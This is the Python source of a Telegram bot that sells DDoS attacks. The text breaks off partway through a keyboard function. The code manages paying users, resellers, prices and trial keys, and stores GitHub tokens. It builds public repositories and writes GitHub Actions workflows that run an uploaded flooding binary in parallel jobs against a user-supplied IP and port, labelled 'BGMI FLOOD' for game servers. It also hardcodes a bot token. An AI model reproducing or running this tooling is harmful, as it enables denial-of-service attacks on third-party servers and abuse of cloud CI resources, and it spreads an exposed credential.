import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ==================== CONFIGURATION ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8702317329:AAGAzAHD_-cSXCTbUH-oHhx5yIZa-saycmw"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "flame"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [5016764281]
OWNER_USERNAME = "@Swartzrxn"

# ==================== BOLD TEXT CONVERTER ====================
def bold(text):
    """Convert text to bold Unicode characters"""
    bold_map = {
        '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒',
        '5': '𝟓', '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗',
        'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄',
        'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉',
        'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'O': '𝐎',
        'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓',
        'U': '𝐔', 'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘',
        'Z': '𝐙',
        'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞',
        'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣',
        'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'o': '𝐨',
        'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬', 't': '𝐭',
        'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱', 'y': '𝐲',
        'z': '𝐳',
        '.': '.', ':': ':', '/': '/', '@': '@', '_': '_', '-': '-',
        '[': '[', ']': ']', '(': '(', ')': ')', ' ': ' ',
        '!': '!', '?': '?', ',': ',', "'": "'", '"': '"'
    }
    
    result = ""
    for char in str(text):
        result += bold_map.get(char, char)
    return result

# ==================== LINK CONFIGURATION ====================
def load_links():
    try:
        with open('links_config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        default_links = {
            "channels": [
                {
                    "name": "Private Channel",
                    "username": "@NEON_X_PUBLIC",
                    "type": "private",
                    "invite_link": "",
                    "enabled": True
                },
                {
                    "name": "Public Channel",
                    "username": "@FLAMEXNEO",
                    "link": "https://t.me/FLAMEXNEO",
                    "type": "public",
                    "enabled": True
                }
            ],
            "free_group": {
                "link": "https://t.me/+vrD7yD_euJxhMDg0",
                "id": -1003876101784,
                "enabled": True
            },
            "referral": {
                "base_link": f"https://t.me/{(BOT_TOKEN.split(':')[0])}?start=",
                "enabled": True
            },
            "support": {
                "link": "https://t.me/flame1769_support",
                "enabled": True
            }
        }
        save_links(default_links)
        return default_links

def save_links(links):
    with open('links_config.json', 'w') as f:
        json.dump(links, f, indent=2)

# ==================== FREE USER SETTINGS ====================
def load_free_settings():
    try:
        with open('free_settings.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        default_settings = {
            "max_duration": 60,
            "cooldown": 300,
            "max_attacks_per_day": 3,
            "feedback_required": True,
            "free_group_id": -1003876101784
        }
        save_free_settings(default_settings)
        return default_settings

def save_free_settings(settings):
    with open('free_settings.json', 'w') as f:
        json.dump(settings, f, indent=2)

# ==================== PRICE CONFIGURATION ====================
def load_prices():
    try:
        with open('prices.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        default_prices = {
            "user": {
                "1": 120,
                "2": 240,
                "3": 360,
                "4": 450,
                "7": 650
            },
            "reseller": {
                "1": 150,
                "2": 250,
                "3": 300,
                "4": 400,
                "7": 550
            }
        }
        save_prices(default_prices)
        return default_prices

def save_prices(prices):
    with open('prices.json', 'w') as f:
        json.dump(prices, f, indent=2)

# ==================== REFERRAL SYSTEM ====================
def load_referrals():
    try:
        with open('referrals.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_referrals(referrals):
    with open('referrals.json', 'w') as f:
        json.dump(referrals, f, indent=2)

def load_feedback():
    try:
        with open('feedback.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_feedback(feedback):
    with open('feedback.json', 'w') as f:
        json.dump(feedback, f, indent=2)

def load_server_activity():
    try:
        with open('server_activity.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_server_activity(activity):
    with open('server_activity.json', 'w') as f:
        json.dump(activity, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

# ==================== USER DATA FUNCTIONS ====================
def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def save_binary_file(binary_content):
    try:
        with open(BINARY_STORAGE_PATH, 'wb') as f:
            f.write(binary_content)
        logger.info("Binary file saved to storage")
        return True
    except Exception as e:
        logger.error(f"Error saving binary file: {e}")
        return False

def load_binary_file():
    try:
        if os.path.exists(BINARY_STORAGE_PATH):
            with open(BINARY_STORAGE_PATH, 'rb') as f:
                return f.read()
        return None
    except Exception as e:
        logger.error(f"Error loading binary file: {e}")
        return None

def upload_binary_to_repo(token_data, binary_content):
    try:
        g = Github(token_data['token'])
        repo = g.get_repo(token_data['repo'])

        try:
            existing_file = repo.get_contents(BINARY_FILE_NAME)
            repo.update_file(
                BINARY_FILE_NAME,
                "Update binary file",
                binary_content,
                existing_file.sha,
                branch="main"
            )
            logger.info(f"Updated binary in {token_data['repo']}")
            return True, "Updated"
        except:
            repo.create_file(
                BINARY_FILE_NAME,
                "Upload binary file",
                binary_content,
                branch="main"
            )
            logger.info(f"Created binary in {token_data['repo']}")
            return True, "Created"
    except Exception as e:
        logger.error(f"Error uploading binary to {token_data['repo']}: {e}")
        return False, str(e)

# ==================== LOAD ALL DATA ====================
links_config = load_links()
free_settings = load_free_settings()
prices = load_prices()
referrals = load_referrals()
feedback_data = load_feedback()
server_activity = load_server_activity()
trial_keys = load_trial_keys()

authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
user_attack_counts = load_user_attack_counts()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

# ==================== USER TRACKING ====================
user_attack_counters = {}
user_feedback_status = {}
user_server = {}
free_user_attack_counts = {}
free_user_last_attack = {}

temp_data = {}

# ==================== CONVERSATION STATES ====================
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_ATTACK_IP = 7
WAITING_FOR_ATTACK_PORT = 8
WAITING_FOR_ATTACK_TIME = 9
WAITING_FOR_ADD_USER_ID = 10
WAITING_FOR_ADD_USER_DAYS = 11
WAITING_FOR_REMOVE_USER_ID = 12
WAITING_FOR_TRIAL_HOURS = 13
WAITING_FOR_OWNER_ADD_ID = 14
WAITING_FOR_OWNER_ADD_USERNAME = 15
WAITING_FOR_OWNER_REMOVE_ID = 16
WAITING_FOR_RESELLER_ADD_ID = 17
WAITING_FOR_RESELLER_ADD_CREDITS = 18
WAITING_FOR_RESELLER_ADD_USERNAME = 19
WAITING_FOR_RESELLER_REMOVE_ID = 20
WAITING_FOR_TOKEN_ADD = 21
WAITING_FOR_TOKEN_REMOVE = 22
WAITING_FOR_REDEEM_KEY = 23
WAITING_FOR_SERVER_SELECTION = 24
WAITING_FOR_REFERRAL = 25
WAITING_FOR_FEEDBACK = 26
WAITING_FOR_FREE_ATTACK = 27
WAITING_FOR_SET_PRICE = 28
WAITING_FOR_LINK_UPDATE = 29
WAITING_FOR_GROUP_ID = 30
WAITING_FOR_PRIVATE_LINK = 31
WAITING_FOR_FREE_SETTINGS = 32

# ==================== HELPER FUNCTIONS ====================
def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def is_free_user(user_id):
    user_id_str = str(user_id)
    return user_server.get(user_id_str) == "FREE" or user_id_str in free_user_attack_counts

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, f"⚠️ {bold('𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐁𝐨𝐭 𝐢𝐬 𝐮𝐧𝐝𝐞𝐫 𝐦𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    if current_attack is not None:
        return False, f"⚠️ {bold('𝐄𝐑𝐑𝐎𝐑: 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐑𝐔𝐍𝐍𝐈𝐍𝐆')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐬.')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ {bold('𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭')} {bold(str(remaining_time))} {bold('𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐧𝐞𝐰 𝐚𝐭𝐭𝐚𝐜𝐤.')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    return True, f"{bold('𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐭𝐭𝐚𝐜𝐤')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, f"⚠️ {bold('𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏')} - {bold('𝐈𝐏𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡')} '15' {bold('𝐨𝐫')} '96' {bold('𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method, server_type):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "server": server_type,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()

    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)
    
    if user_id_str not in user_attack_counters:
        user_attack_counters[user_id_str] = 0
    user_attack_counters[user_id_str] += 1
    
    if user_id_str not in server_activity:
        server_activity[user_id_str] = {}
    server_activity[user_id_str]['last_attack'] = time.time()
    server_activity[user_id_str]['server'] = server_type
    save_server_activity(server_activity)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until

    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))

        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }

    return {"status": "ready"}

def generate_trial_key(hours, created_by="system"):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": created_by
    }
    save_trial_keys(trial_keys)

    return key

def redeem_trial_key(key, user_id, update):
    user_id_str = str(user_id)

    if key not in trial_keys:
        return False, f"❌ {bold('𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    key_data = trial_keys[key]

    if key_data["used"]:
        return False, f"❌ {bold('𝐊𝐞𝐲 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐮𝐬𝐞𝐝')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    if time.time() > key_data["expiry"]:
        return False, f"❌ {bold('𝐊𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞𝐝')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)

    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": update.effective_user.username or f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    return True, f"✅ {bold('𝐓𝐫𝐢𝐚𝐥 𝐚𝐜𝐜𝐞𝐬𝐬 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 𝐟𝐨𝐫')} {bold(str(key_data['hours']))} {bold('𝐡𝐨𝐮𝐫𝐬')}!\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

def deduct_reseller_credit(reseller_id):
    reseller_id_str = str(reseller_id)
    if reseller_id_str in resellers:
        current_credits = resellers[reseller_id_str].get('credits', 0)
        if current_credits >= 10:
            resellers[reseller_id_str]['credits'] = current_credits - 10
            resellers[reseller_id_str]['total_added'] = resellers[reseller_id_str].get('total_added', 0) + 1
            save_resellers(resellers)
            return True, current_credits - 10
        else:
            return False, current_credits
    return False, 0

def create_repository(token, repo_name="flamecrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()

        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="flameCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: flamecrack fucker
on: [push]

jobs:

  stage-0:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x 
      - run: ./ {ip} {port} 10 76

  stage-1:
    needs: stage-0
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x 
      - run: ./ {ip} {port} {time_val} 76

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
    steps:
      - id: calc
        run: |
          
          NUM_JOBS=$(({time_val} / 10))
          
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
    steps:
      - uses: actions/checkout@v3
      - name: Sequential 10s Burst
        run: |
          chmod +x 
          ./ {ip} {port} 10 76
"""

    try:
        g = Github(token)
        repo = g.get_repo(repo_name)

        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"Created configuration for {repo_name}")

        return True
    except Exception as e:
        logger.error(f"Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)

        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0

        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"Error getting {status} workflows: {e}")

        return total_cancelled

    except Exception as e:
        logger.error(f"Error accessing {repo_name}: {e}")
        return 0

def check_token_status(token_data):
    try:
        g = Github(token_data['token'])
        user = g.get_user()
        _ = user.login
        repo = g.get_repo(token_data['repo'])
        _ = repo.get_contents("README.md")
        return "active"
    except Exception as e:
        error_str = str(e)
        if "Bad credentials" in error_str or "401" in error_str:
            return "invalid"
        elif "403" in error_str or "rate limit" in error_str.lower() or "flagged" in error_str.lower():
            return "suspended"
        else:
            return "unknown"

# ==================== CHANNEL CHECK FUNCTION (FIXED) ====================
async def check_channel_membership(user_id, context):
    """Check if user has joined required channels - FIXED for private channels"""
    channels = links_config["channels"]
    not_joined = []
    
    for channel in channels:
        if not channel["enabled"]:
            continue
            
        try:
            # Get chat ID from username
            chat = await context.bot.get_chat(channel["username"])
            
            # Check member status
            try:
                member = await context.bot.get_chat_member(chat.id, user_id)
                
                # Check if member is in the channel and not left/banned
                if member.status in [ChatMember.LEFT, ChatMember.BANNED, ChatMember.RESTRICTED]:
                    not_joined.append(channel)
                    logger.info(f"User {user_id} is {member.status} in {channel['username']}")
                else:
                    # Member is in good standing (MEMBER, ADMINISTRATOR, CREATOR)
                    logger.info(f"User {user_id} is {member.status} in {channel['username']}")
                    
            except Exception as e:
                # If we can't get member info, assume not joined
                logger.error(f"Error getting member status for {channel['username']}: {e}")
                not_joined.append(channel)
                
        except Exception as e:
            # If we can't get chat info, assume channel is inaccessible
            logger.error(f"Error getting chat {channel['username']}: {e}")
            not_joined.append(channel)
    
    logger.info(f"Channel check for user {user_id}: {len(not_joined)} channels not joined")
    return not_joined

# ==================== KEYBOARD FUNCTIONS ====================
def get_main_keyboard(user_id):
    """Generate main keyboard based on user role"""
    keyboard = []

    keyboard.append([KeyboardButton(bold("🎯 𝐋𝐚𝐮𝐧𝐜𝐡 𝐀𝐭𝐭𝐚𝐜𝐤")), KeyboardButton(bold("📊 𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐚𝐭𝐮𝐬"))])
    keyboard.append([KeyboardButton(bold("🛑 𝐒𝐭𝐨𝐩 𝐀𝐭𝐭𝐚𝐜𝐤")), KeyboardButton(bold("🔐 𝐌𝐲 𝐀𝐜𝐜𝐞𝐬𝐬"))])

    if is_owner(user_id) or is_admin(user_id) or is_reseller(user_id):
        keyboard.append([KeyboardButton(bold("👥 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭"))])

    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton(bold("⚙️ 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬"))])

    if is_owner(user_id):
        keyboard.append([KeyboardButton(bold("👑 𝐎𝐰𝐧𝐞𝐫 𝐏𝐚𝐧𝐞𝐥")), KeyboardButton(bold("🔑 𝐓𝐨𝐤𝐞𝐧 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭"))])
        keyboard.append([KeyboardButton(bold("💰 𝐏𝐫𝐢𝐜𝐞 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭")), KeyboardButton(bold("🆓 𝐅𝐫𝐞𝐞 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐬"))])
        keyboard.append([KeyboardButton(bold("🔗 𝐋𝐢𝐧𝐤 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬"))])

    keyboard.append([KeyboardButton(bold("🎟️ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐊𝐞𝐲")), KeyboardButton(bold("❓ 𝐇𝐞𝐥𝐩"))])

    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_server_selection_keyboard():
    """Keyboard for server selection"""
    keyboard = [
        [KeyboardButton(bold("🔥 𝐅𝐋𝐀𝐌𝐄 𝐒𝐄𝐑𝐕𝐄𝐑")), KeyboardButton(bold("👤 𝐓𝐀𝐍𝐌𝐀𝐘 𝐒𝐄𝐑𝐕𝐄𝐑"))],
        [KeyboardButton(bold("💎 𝐍𝐄𝐎 𝐒𝐄𝐑𝐕𝐄𝐑")), KeyboardButton(bold("🆓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑"))],
        [KeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_management_keyboard(user_id):
    """User management keyboard"""
    keyboard = [
        [KeyboardButton(bold("➕ 𝐀𝐝𝐝 𝐔𝐬𝐞𝐫")), KeyboardButton(bold("➖ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫"))],
        [KeyboardButton(bold("📋 𝐔𝐬𝐞𝐫𝐬 𝐋𝐢𝐬𝐭")), KeyboardButton(bold("⏳ 𝐏𝐞𝐧𝐝𝐢𝐧𝐠 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬"))],
    ]
    
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton(bold("🔑 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐓𝐫𝐢𝐚𝐥 𝐊𝐞𝐲"))])
    
    keyboard.append([KeyboardButton(bold("💰 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭"))])
    keyboard.append([KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_owner_panel_keyboard():
    """Owner panel keyboard"""
    keyboard = [
        [KeyboardButton(bold("👑 𝐀𝐝𝐝 𝐎𝐰𝐧𝐞𝐫")), KeyboardButton(bold("🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐎𝐰𝐧𝐞𝐫"))],
        [KeyboardButton(bold("💰 𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫")), KeyboardButton(bold("🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫"))],
        [KeyboardButton(bold("📋 𝐎𝐰𝐧𝐞𝐫𝐬 𝐋𝐢𝐬𝐭")), KeyboardButton(bold("💰 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬 𝐋𝐢𝐬𝐭"))],
        [KeyboardButton(bold("📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭")), KeyboardButton(bold("📤 𝐔𝐩𝐥𝐨𝐚𝐝 𝐁𝐢𝐧𝐚𝐫𝐲"))],
        [KeyboardButton(bold("➕ 𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭𝐬")), KeyboardButton(bold("📊 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐒𝐭𝐚𝐭𝐬"))],
        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_bot_settings_keyboard():
    """Bot settings keyboard"""
    keyboard = [
        [KeyboardButton(bold("🔧 𝐓𝐨𝐠𝐠𝐥𝐞 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞")), KeyboardButton(bold("⏱️ 𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧"))],
        [KeyboardButton(bold("📋 𝐀𝐝𝐦𝐢𝐧 𝐋𝐢𝐬𝐭"))],
